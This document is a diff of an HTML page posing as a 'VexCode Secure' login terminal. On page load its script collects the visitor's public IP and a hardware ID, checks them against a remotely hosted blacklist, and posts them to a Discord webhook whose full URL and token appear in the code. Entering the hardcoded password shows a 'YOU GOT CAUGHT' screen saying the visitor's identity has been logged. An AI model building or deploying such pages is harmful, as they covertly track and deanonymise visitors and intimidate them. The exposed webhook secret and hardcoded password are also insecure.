@@ -31,58 +31,15 @@
       border-radius: 20px;
       box-shadow: inset 0 0 20px rgba(0, 140, 255, 0.2), 0 15px 30px rgba(0, 0, 0, 0.6);
       text-align: center;
-      display: none; /* Everything starts hidden until script runs */
+      display: none; /* Stay hidden until initialization finishes */
     }
-    
-    h2 {
-      margin: 0 0 20px 0;
-      letter-spacing: 2px;
-      font-size: 16px;
-      text-transform: uppercase;
-      color: #00c6ff;
-      text-shadow: 0 0 8px rgba(0, 198, 255, 0.6);
-    }
-    .sysinfo-panel {
-      background: #050a16;
-      border: 1px solid #1e90ff;
-      border-radius: 12px;
-      padding: 12px;
-      margin-top: 15px;
-      font-size: 11px;
-      text-align: left;
-      color: #8cbaff;
-    }
-    .sysinfo-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 4px 0;
-      border-bottom: 1px dotted #1e4f7a;
-    }
+    h2 { margin: 0 0 20px 0; letter-spacing: 2px; font-size: 16px; text-transform: uppercase; color: #00c6ff; text-shadow: 0 0 8px rgba(0, 198, 255, 0.6); }
+    .sysinfo-panel { background: #050a16; border: 1px solid #1e90ff; border-radius: 12px; padding: 12px; margin-top: 15px; font-size: 11px; text-align: left; color: #8cbaff; }
+    .sysinfo-row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px dotted #1e4f7a; }
     .sysinfo-value { font-weight: bold; color: #00ffb3; }
-    
     label { font-size: 11px; opacity: 0.7; display: block; text-align: left; margin-bottom: 5px; }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      background: #050a16;
-      border: 1px solid #1e90ff;
-      border-radius: 10px;
-      color: #4db8ff;
-      box-sizing: border-box;
-      outline: none;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 12px;
-      background: linear-gradient(90deg, #1e90ff, #00c6ff);
-      font-weight: bold;
-      cursor: pointer;
-      color: #001428;
-      text-transform: uppercase;
-    }
+    input { width: 100%; padding: 12px; margin-bottom: 15px; background: #050a16; border: 1px solid #1e90ff; border-radius: 10px; color: #4db8ff; box-sizing: border-box; outline: none; }
+    button { width: 100%; padding: 12px; border: none; border-radius: 12px; background: linear-gradient(90deg, #1e90ff, #00c6ff); font-weight: bold; cursor: pointer; color: #001428; text-transform: uppercase; }
     #err_msg { color: #ff4d4d; font-size: 10px; margin-bottom: 10px; min-height: 12px; }
     .footer { margin-top: 15px; font-size: 10px; opacity: 0.4; }
     .caught-message { color: #ff5555; font-size: 22px; font-weight: bold; margin: 20px 0; animation: pulse 1s infinite; }
@@ -108,28 +65,25 @@
     <div class="caught-message">YOU GOT CAUGHT</div>
     <div class="sysinfo-panel">
       <div class="sysinfo-row"><span>IP</span><span id="caught_ip">-</span></div>
-      <div class="sysinfo-row"><span>DEVICE</span><span id="caught_dev">-</span></div>
-      <div class="sysinfo-row"><span>OS</span><span id="caught_os">-</span></div>
+      <div class="sysinfo-row"><span>HWID</span><span id="caught_hwid">-</span></div>
     </div>
     <div class="footer">YOUR IDENTITY HAS BEEN LOGGED</div>
   </div>
 
-  <div id="login_ui" class="terminal" style="display: block;">
+  <div id="login_ui" class="terminal">
     <h2>⚡ VexCode Secure</h2>
     <div id="err_msg"></div>
-    
     <label>SYSTEM AUTHENTICATION</label>
     <input type="password" id="password_input" placeholder="ENTER ACCESS KEY">
     <button id="auth_btn">▶ AUTHORIZE</button>
-    
-    <div class="footer">SECURE CHANNEL · v.5.2</div>
+    <div class="footer">SECURE CHANNEL · v.5.3</div>
   </div>
 </div>
 
 <script>
 (function() {
   const WEBHOOK = 'https://discord.com/api/webhooks/1477568166681903166/PJlF61ClzxqXVf65w6jtZeUHUPew8Vk7h4THfp_drir0REEJqqNgYs22HrV8iVZKlomV';
-  // Note: Removed the commit hash so it always pulls the newest blacklist
+  // Always use the /raw/blacklist.json link to ensure the latest version
   const BLACKLIST_URL = 'https://gist.githubusercontent.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/raw/blacklist.json';
   const PASS = "1234";
 
@@ -149,71 +103,81 @@
 
   function notify(type) {
     const hwid = getHWID();
-    const embed = {
-      title: type === 'ban' ? '🚫 BANNED USER ATTEMPT' : (type === 'caught' ? '🎯 TARGET CAUGHT' : '👁️ NEW VISITOR'),
-      color: type === 'ban' ? 0xff0000 : (type === 'caught' ? 0xffaa00 : 0x00c6ff),
-      fields: [
-        { name: 'IP Address', value: userIP, inline: true },
-        { name: 'Hardware ID', value: hwid, inline: true },
-        { name: 'Browser/OS', value: navigator.platform, inline: false }
-      ],
-      timestamp: new Date().toISOString()
-    };
     fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
-    });
+      body: JSON.stringify({
+        embeds: [{
+          title: type === 'ban' ? '🚫 BANNED ATTEMPT' : (type === 'caught' ? '🎯 CAUGHT' : '👁️ VISIT'),
+          color: type === 'ban' ? 0xff0000 : (type === 'caught' ? 0xffaa00 : 0x00c6ff),
+          fields: [
+            { name: 'IP', value: userIP, inline: true },
+            { name: 'HWID', value: hwid, inline: true }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      })
+    }).catch(e => console.error("Webhook failed:", e));
   }
 
-  const hwid = getHWID();
-
-  // --- NEW LOGIC: Wait for both IP and Blacklist before showing anything ---
   async function initialize() {
-    try {
-      // Run both fetches at once
-      const [ipRes, listRes] = await Promise.all([
-        fetch('https://api.ipify.org?format=json'),
-        fetch(BLACKLIST_URL + '?t=' + Date.now())
-      ]);
+    const hwid = getHWID();
+    console.log("--- VEXCODE INITIALIZING ---");
+    console.log("Your HWID:", hwid);
 
+    try {
+      // 1. Fetch IP
+      const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
       userIP = ipData.ip;
+      console.log("Your IP:", userIP);
 
+      // 2. Fetch Blacklist (Cache busting with timestamp)
+      const listRes = await fetch(BLACKLIST_URL + '?nocache=' + Date.now());
       const listData = await listRes.json();
-      if(listData.banned_ips) listData.banned_ips.forEach(i => BAN_LIST.ips.add(i));
-      if(listData.banned_device_ids) listData.banned_device_ids.forEach(i => BAN_LIST.ids.add(i));
+      
+      console.log("Blacklist Data Received:", listData);
 
-      // Now check if user is banned
-      if (BAN_LIST.ips.has(userIP) || BAN_LIST.ids.has(hwid)) {
-        document.getElementById('login_ui').style.display = 'none';
+      // Populate Sets (Support both singular and plural keys just in case)
+      const rawIps = listData.banned_ips || listData.banned_ip || [];
+      const rawIds = listData.banned_device_ids || listData.banned_hwids || [];
+      
+      rawIps.forEach(i => BAN_LIST.ips.add(i.trim()));
+      rawIds.forEach(i => BAN_LIST.ids.add(i.trim()));
+
+      console.log("Banned IPs in Memory:", Array.from(BAN_LIST.ips));
+      console.log("Banned HWIDs in Memory:", Array.from(BAN_LIST.ids));
+
+      // 3. Execution Logic
+      const isIpBanned = BAN_LIST.ips.has(userIP);
+      const isIdBanned = BAN_LIST.ids.has(hwid);
+
+      if (isIpBanned || isIdBanned) {
+        console.log("!!! BAN DETECTED !!!");
         document.getElementById('gate_msg').style.display = 'block';
         document.getElementById('ban_ip').textContent = userIP;
         document.getElementById('ban_id').textContent = hwid;
         notify('ban');
       } else {
-        // User is clean, show login
+        console.log("Access Clear. Showing Login.");
         document.getElementById('login_ui').style.display = 'block';
         notify('visit');
       }
 
     } catch (e) {
-      console.error("Initialization failed", e);
-      // Fallback: show login if blacklist fails (change this to hide if you want it strict)
-      document.getElementById('login_ui').style.display = 'block';
+      console.error("Initialization Error:", e);
+      document.getElementById('login_ui').style.display = 'block'; // Failsafe
     }
   }
 
   initialize();
 
   document.getElementById('auth_btn').onclick = function() {
-    const val = document.getElementById('password_input').value;
-    if (val === PASS) {
+    if (document.getElementById('password_input').value === PASS) {
       document.getElementById('login_ui').style.display = 'none';
       document.getElementById('caught_msg').style.display = 'block';
       document.getElementById('caught_ip').textContent = userIP;
-      document.getElementById('caught_dev').textContent = navigator.vendor || "Generic";
-      document.getElementById('caught_os').textContent = navigator.platform;
+      document.getElementById('caught_hwid').textContent = getHWID();
       notify('caught');
     } else {
       document.getElementById('err_msg').textContent = 'INVALID ACCESS KEY';
